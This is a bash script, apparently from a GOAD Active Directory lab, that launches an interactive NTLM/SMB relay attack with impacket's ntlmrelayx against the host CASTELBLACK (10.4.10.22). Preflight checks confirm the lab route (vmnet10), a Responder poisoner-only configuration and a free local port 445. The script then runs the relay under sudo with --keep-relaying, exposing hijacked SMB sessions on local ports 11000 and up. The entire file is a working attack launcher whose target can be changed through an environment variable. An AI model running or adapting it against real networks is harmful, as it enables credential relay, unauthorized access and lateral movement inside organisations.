#!/usr/bin/env bash
# Start a scoped interactive SMB relay against CASTELBLACK.
# A successful relay exposes the retained SMB session on 127.0.0.1:11000+.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.22}"

find_ntlmrelayx() {
  local c
  for c in \
    "$(command -v impacket-ntlmrelayx 2>/dev/null || true)" \
    "$(command -v ntlmrelayx.py 2>/dev/null || true)" \
    /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -x "$c" || -f "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

find_responder_conf() {
  local c
  for c in \
    /etc/responder/Responder.conf \
    /usr/share/responder/Responder.conf \
    /opt/tools/Responder/Responder.conf; do
    [[ -f "$c" ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

cd "$ROOT" || exit 1

echo '===== INTERACTIVE SMB RELAY PREFLIGHT ====='

branch="$(git branch --show-current)"
[[ "$branch" == "kingdoms/phase03-overlay" ]] || {
  echo "FAIL: expected kingdoms/phase03-overlay, got $branch" >&2
  exit 1
}

ip route get "$TARGET" | grep -Eq 'dev vmnet10([[:space:]]|$)' || {
  echo "FAIL: $TARGET does not route through vmnet10" >&2
  exit 1
}

timeout 4 nc -z -w3 "$TARGET" 445 >/dev/null 2>&1 || {
  echo "FAIL: $TARGET TCP/445 is not reachable" >&2
  exit 1
}

if pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' >/dev/null; then
  echo 'FAIL: ntlmrelayx is already running' >&2
  pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' || true
  exit 1
fi

if ss -H -lnt 2>/dev/null | grep -Eq '(^|[[:space:]])[^[:space:]]*:445[[:space:]]'; then
  echo 'FAIL: local TCP/445 is already in use' >&2
  exit 1
fi

NTLMRELAYX="$(find_ntlmrelayx || true)"
[[ -n "$NTLMRELAYX" ]] || {
  echo 'FAIL: ntlmrelayx not found' >&2
  exit 1
}

RESPONDER_CONF="$(find_responder_conf || true)"
[[ -n "$RESPONDER_CONF" ]] || {
  echo 'FAIL: Responder.conf not found' >&2
  exit 1
}

responder_smb="$(awk -F= '/^[[:space:]]*SMB[[:space:]]*=/{gsub(/[[:space:]]/,"",$2); print tolower($2); exit}' "$RESPONDER_CONF")"
responder_http="$(awk -F= '/^[[:space:]]*HTTP[[:space:]]*=/{gsub(/[[:space:]]/,"",$2); print tolower($2); exit}' "$RESPONDER_CONF")"

[[ "$responder_smb" == "off" ]] || {
  echo "FAIL: Responder SMB server must be Off in $RESPONDER_CONF" >&2
  exit 1
}

[[ "$responder_http" == "off" ]] || {
  echo "FAIL: Responder HTTP server must be Off in $RESPONDER_CONF" >&2
  exit 1
}

echo "PASS: Responder poisoner-only config ($RESPONDER_CONF): SMB=Off HTTP=Off"

HELP="$("$NTLMRELAYX" -h 2>&1 || true)"
for opt in -t -i -smb2support --keep-relaying; do
  grep -Fq -- "$opt" <<<"$HELP" || {
    echo "FAIL: ntlmrelayx missing expected option $opt" >&2
    exit 1
  }
done

echo "PASS: target=$TARGET"
echo 'PASS: route=vmnet10'
echo 'PASS: TCP/445 reachable'
echo 'PASS: local TCP/445 free'
echo 'INFO: foreground mode is intentional; leave this terminal open'
echo 'INFO: on success, ntlmrelayx will bind the retained session on 127.0.0.1:11000+'
echo

args=(
  -t "smb://$TARGET"
  -smb2support
  -i
  --keep-relaying
)

exec sudo "$NTLMRELAYX" "${args[@]}"
